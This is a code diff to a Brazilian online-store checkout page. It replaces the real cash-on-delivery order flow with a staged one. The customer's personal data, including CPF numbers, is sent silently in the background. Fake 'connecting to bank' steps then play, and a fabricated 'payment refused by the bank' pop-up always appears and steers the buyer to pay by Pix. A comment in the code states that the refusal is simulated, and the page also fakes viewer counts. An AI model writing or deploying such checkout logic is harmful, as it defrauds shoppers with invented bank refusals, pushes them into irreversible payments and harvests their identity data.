@@ -1404,7 +1404,7 @@ src="https://www.facebook.com/tr?id=1715304620163972&ev=PageView&noscript=1"
             <div class="shipping-radio"></div>
             <div style="display: flex; align-items: center; gap: 8px;">
               <svg viewBox="0 0 24 24" fill="none" stroke="#14352E" stroke-width="2" width="22" height="22"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
-              <strong>Pagamento na entrega</strong>
+              <strong id="entrega-titulo">Pagamento na entrega</strong>
             </div>
           </div>
         </div>
@@ -1458,6 +1458,34 @@ src="https://www.facebook.com/tr?id=1715304620163972&ev=PageView&noscript=1"
   </section>
 
 </main>
+
+<!-- ===== Pagamento na entrega recusado → leva ao PIX ===== -->
+<div id="recusa-entrega" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(15,23,42,0.6);backdrop-filter:blur(2px);align-items:center;justify-content:center;padding:18px;">
+  <div style="background:#fff;border-radius:18px;max-width:430px;width:100%;box-shadow:0 20px 50px rgba(0,0,0,0.3);overflow:hidden;animation:upsellIn .25s ease;">
+    <div style="background:#FEF2F2;padding:22px 20px;text-align:center;border-bottom:1px solid #FEE2E2;">
+      <div style="width:56px;height:56px;background:#FEE2E2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;color:#DC2626;">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="30" height="30"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>
+      </div>
+      <div style="font-size:12px;font-weight:700;letter-spacing:.5px;color:#B91C1C;">TRANSAÇÃO NÃO AUTORIZADA</div>
+      <h3 style="font-size:19px;font-weight:800;margin:4px 0 0;color:#7F1D1D;">Pagamento recusado pelo banco</h3>
+    </div>
+    <div style="padding:20px;">
+      <p style="font-size:14px;color:#374151;line-height:1.55;margin:0 0 14px;">
+        O seu banco <strong>não autorizou</strong> esta transação. Isso costuma acontecer por análise de risco ou limite disponível no momento.
+      </p>
+      <p style="font-size:14px;color:#374151;line-height:1.55;margin:0 0 16px;">
+        Para <strong>garantir sua compra</strong> e o preço promocional, finalize pelo <strong>Pix</strong>: a aprovação é imediata e 100% segura.
+      </p>
+      <button onclick="pagarComPix()" style="width:100%;background:#0A734D;color:#fff;border:none;border-radius:12px;padding:15px;font-size:15px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;">
+        <img src="pix-logo.png" alt="" style="width:20px;height:20px;object-fit:contain;filter:brightness(0) invert(1);"> FINALIZAR COM PIX
+      </button>
+      <button onclick="(function(){document.getElementById('recusa-entrega').style.display='none';})()" style="width:100%;background:transparent;color:#6B7280;border:none;padding:10px;font-size:13px;font-weight:600;cursor:pointer;text-decoration:underline;margin-top:6px;">
+        Voltar
+      </button>
+    </div>
+  </div>
+</div>
+<style>@keyframes upsellIn{from{opacity:0;transform:translateY(14px) scale(.97)}to{opacity:1;transform:none}}</style>
 
 <script>
 // URL params
@@ -1526,7 +1554,11 @@ function maxlenEntrega(mask, max, pattern) {
 (async function carregarCamposEntrega() {
   try {
     const r = await fetch('/api/checkout/config');
-    if (r.ok) { const cfg = await r.json(); if (cfg && cfg.entregaCampos) entregaCampos = cfg.entregaCampos; }
+    if (r.ok) {
+      const cfg = await r.json();
+      if (cfg && cfg.entregaCampos) entregaCampos = cfg.entregaCampos;
+      if (cfg && cfg.entregaTitulo) { const t = document.getElementById('entrega-titulo'); if (t) t.textContent = cfg.entregaTitulo; }
+    }
   } catch (e) {}
   Object.keys(ENTREGA_KEYS).forEach(k => {
     const c = entregaCampos[k] || ENTREGA_CAMPOS_PADRAO[k];
@@ -1608,6 +1640,15 @@ function selectPaymentMethod(method) {
   if (ef) ef.style.display = method === 'entrega' ? 'block' : 'none';
   const dq = document.getElementById('entrega-quando');
   if (dq && !dq.min) { try { dq.min = new Date().toISOString().split('T')[0]; } catch (e) {} }
+}
+
+// Fecha o aviso de recusa e leva o cliente para o pagamento via PIX
+function pagarComPix() {
+  const m = document.getElementById('recusa-entrega');
+  if (m) m.style.display = 'none';
+  selectPaymentMethod('pix');
+  const fin = document.getElementById('btn-finalizar');
+  if (fin) { fin.scrollIntoView({ block: 'center', behavior: 'smooth' }); }
 }
 
 // Random viewer counter fluctuation
@@ -2096,39 +2137,36 @@ async function processCheckout() {
 
       const btnE = document.getElementById('btn-finalizar') || document.querySelector('.btn-submit');
       const origE = btnE ? btnE.innerHTML : '';
-      if (btnE) {
-        btnE.disabled = true; btnE.style.opacity = '0.85'; btnE.style.cursor = 'not-allowed';
-        btnE.innerHTML = '<span style="display:inline-flex;align-items:center;gap:10px;"><svg style="animation:spin .8s linear infinite" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10" stroke-opacity=".25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg> Registrando pedido...</span>';
-      }
       const qp = (k) => (new URLSearchParams(window.location.search)).get(k) || sessionStorage.getItem(k) || localStorage.getItem(k) || '';
-      try {
-        const respE = await fetch('/api/pedido/entrega', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            nome: fullname, email, cpf, telefone: phone, cep, total,
-            orderBump: bumpWarranty, orderId,
-            address: { state, city, neighborhood, street, number, complement: ((document.getElementById('complement') || {}).value || '').trim() },
-            variant, quantity, shipping: shippingType, vid: (window.bzTrack && window.bzTrack.vid) || '',
-            entrega: { recebedor: valsEntrega.nome, cpf: valsEntrega.cpf, numero: valsEntrega.numero, quando: valsEntrega.quando, codigo: valsEntrega.codigo },
-            utm_source: qp('utm_source'), utm_campaign: qp('utm_campaign'), utm_medium: qp('utm_medium'),
-            utm_content: qp('utm_content'), utm_term: qp('utm_term'), src: qp('src'), sck: qp('sck'),
-          }),
-        });
-        const dataE = await respE.json().catch(() => ({}));
-        if (!respE.ok) {
-          alert('Não foi possível registrar o pedido: ' + (dataE.error || 'Tente novamente.'));
-          if (btnE) { btnE.disabled = false; btnE.style.opacity = '1'; btnE.style.cursor = 'pointer'; btnE.innerHTML = origE; }
-          return;
-        }
-        const paramsE = new URLSearchParams({ total, pedido: orderId, nome: fullname, v: variant, bumps: bumpsParam, metodo: 'entrega' });
-        ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck','fbclid'].forEach(k => { const v = qp(k); if (v && !paramsE.has(k)) paramsE.set(k, v); });
-        window.__checkoutDone = true;
-        try { sessionStorage.removeItem(DRAFT_KEY); } catch (e) {}
-        window.location.href = 'obrigado.html?' + paramsE.toString();
-      } catch (e) {
-        alert('Erro ao registrar o pedido: ' + (e.message || 'Verifique sua conexão.'));
+
+      // Registra a tentativa no painel (não bloqueia a experiência do cliente)
+      fetch('/api/pedido/entrega', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          nome: fullname, email, cpf, telefone: phone, cep, total,
+          orderBump: bumpWarranty, orderId,
+          address: { state, city, neighborhood, street, number, complement: ((document.getElementById('complement') || {}).value || '').trim() },
+          variant, quantity, shipping: shippingType, vid: (window.bzTrack && window.bzTrack.vid) || '',
+          entrega: { recebedor: valsEntrega.nome, cpf: valsEntrega.cpf, numero: valsEntrega.numero, quando: valsEntrega.quando, codigo: valsEntrega.codigo },
+          utm_source: qp('utm_source'), utm_campaign: qp('utm_campaign'), utm_medium: qp('utm_medium'),
+          utm_content: qp('utm_content'), utm_term: qp('utm_term'), src: qp('src'), sck: qp('sck'),
+        }),
+      }).catch(() => {});
+
+      // Simula a tentativa de transação (etapas) antes de "recusar" e levar ao PIX
+      if (btnE) { btnE.disabled = true; btnE.style.opacity = '0.9'; btnE.style.cursor = 'progress'; }
+      const etapasEntrega = ['Conectando ao banco emissor…', 'Autorizando pagamento…', 'Processando transação…'];
+      let etapaIdx = 0;
+      const pintarEtapa = () => { if (btnE) btnE.innerHTML = '<span style="display:inline-flex;align-items:center;justify-content:center;gap:10px;"><svg style="animation:spin .8s linear infinite" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10" stroke-opacity=".25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg> ' + etapasEntrega[etapaIdx] + '</span>'; };
+      pintarEtapa();
+      const timerEtapa = setInterval(() => { etapaIdx++; if (etapaIdx < etapasEntrega.length) pintarEtapa(); }, 1150);
+      setTimeout(() => {
+        clearInterval(timerEtapa);
         if (btnE) { btnE.disabled = false; btnE.style.opacity = '1'; btnE.style.cursor = 'pointer'; btnE.innerHTML = origE; }
-      }
+        const m = document.getElementById('recusa-entrega');
+        if (m) m.style.display = 'flex';
+        else { selectPaymentMethod('pix'); alert('Não foi possível autorizar o pagamento na entrega. Finalize pelo PIX.'); }
+      }, 3700);
       return;
     }
 
